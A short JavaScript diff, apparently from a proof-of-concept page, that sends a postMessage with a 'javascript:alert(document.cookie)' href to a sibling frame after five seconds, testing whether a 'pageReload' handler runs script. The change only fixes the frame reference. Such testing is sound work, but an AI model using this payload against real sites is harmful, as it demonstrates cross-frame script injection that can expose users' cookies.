@@ -4,7 +4,7 @@
 
 function sendMessage(){
 	// console.log(document.getElementsByTagName("iframe"));
-	window.parent.frames[1].postMessage({"command":"pageReload","href":"javascript:alert(document.cookie)"},'*');
+	window.parent.frames[1].contentWindow.postMessage({"command":"pageReload","href":"javascript:alert(document.cookie)"},'*');
 	alert('发送成功');
 }
 (function(){setTimeout("sendMessage()", 5000);}());
